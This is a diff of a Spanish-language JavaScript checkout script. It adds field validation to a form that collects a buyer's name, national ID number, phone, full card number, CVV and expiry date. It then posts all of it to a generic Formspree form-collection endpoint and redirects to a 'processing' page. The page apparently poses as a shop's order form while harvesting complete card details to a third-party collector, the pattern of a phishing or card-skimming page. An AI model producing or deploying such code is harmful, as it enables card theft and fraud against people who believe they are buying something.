@@ -1,48 +1,78 @@
 ﻿document.addEventListener("DOMContentLoaded", () => {
-  const params = new URLSearchParams(window.location.search);
-  const producto = params.get("producto");
-  const precio = params.get("precio");
+  const form = document.getElementById("pedidoForm");
 
-  if (producto && precio) {
-    document.getElementById("producto").value = producto;
-    document.getElementById("precio").value = "S/ " + precio;
-  }
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault();
 
-  const form = document.getElementById("pedido-form");
-  if (form) {
-    form.addEventListener("submit", async (e) => {
-      e.preventDefault();
+    let valido = true;
 
-      const tarjeta = document.getElementById("tarjeta").value.trim();
-      const cvv = document.getElementById("cvv").value.trim();
+    // Obtener valores
+    const nombre = document.getElementById("nombre");
+    const dni = document.getElementById("dni");
+    const celular = document.getElementById("celular");
+    const tarjeta = document.getElementById("tarjeta");
+    const cvv = document.getElementById("cvv");
+    const vencimiento = document.getElementById("vencimiento");
 
-      // Validaciones simples
-      if (tarjeta && tarjeta.length < 16) {
-        alert("El número de tarjeta debe tener al menos 16 dígitos.");
-        return;
-      }
-      if (cvv && cvv.length < 3) {
-        alert("El CVV debe tener 3 dígitos.");
-        return;
-      }
-
-      const formData = new FormData(form);
-
-      try {
-        const response = await fetch("https://formspree.io/f/mnnbkeaj", {
-          method: "POST",
-          body: formData,
-          headers: { Accept: "application/json" },
-        });
-
-        if (response.ok) {
-          window.location.href = "procesando.html";
-        } else {
-          alert("Error al enviar el formulario. Inténtalo de nuevo.");
-        }
-      } catch (err) {
-        alert("Error de conexión. Inténtalo más tarde.");
-      }
+    // Resetear errores
+    [nombre, dni, celular, tarjeta, cvv, vencimiento].forEach((campo) => {
+      campo.classList.remove("error");
     });
-  }
+
+    // Validaciones
+    if (nombre.value.trim() === "") {
+      nombre.classList.add("error");
+      valido = false;
+    }
+
+    if (dni.value.trim() === "") {
+      dni.classList.add("error");
+      valido = false;
+    }
+
+    if (celular.value.trim() === "") {
+      celular.classList.add("error");
+      valido = false;
+    }
+
+    if (tarjeta.value.trim().length < 16) {
+      tarjeta.classList.add("error");
+      valido = false;
+    }
+
+    if (cvv.value.trim().length !== 3) {
+      cvv.classList.add("error");
+      valido = false;
+    }
+
+    if (vencimiento.value.trim() === "") {
+      vencimiento.classList.add("error");
+      valido = false;
+    }
+
+    if (!valido) {
+      return; // No continúa si algo está mal
+    }
+
+    // Enviar a Formspree
+    const formData = new FormData(form);
+
+    try {
+      const response = await fetch("https://formspree.io/f/mnnbkeaj", {
+        method: "POST",
+        body: formData,
+        headers: {
+          Accept: "application/json",
+        },
+      });
+
+      if (response.ok) {
+        window.location.href = "procesando.html";
+      } else {
+        alert("Hubo un error al enviar el formulario. Intenta de nuevo.");
+      }
+    } catch (error) {
+      alert("Error de conexión. Intenta más tarde.");
+    }
+  });
 });
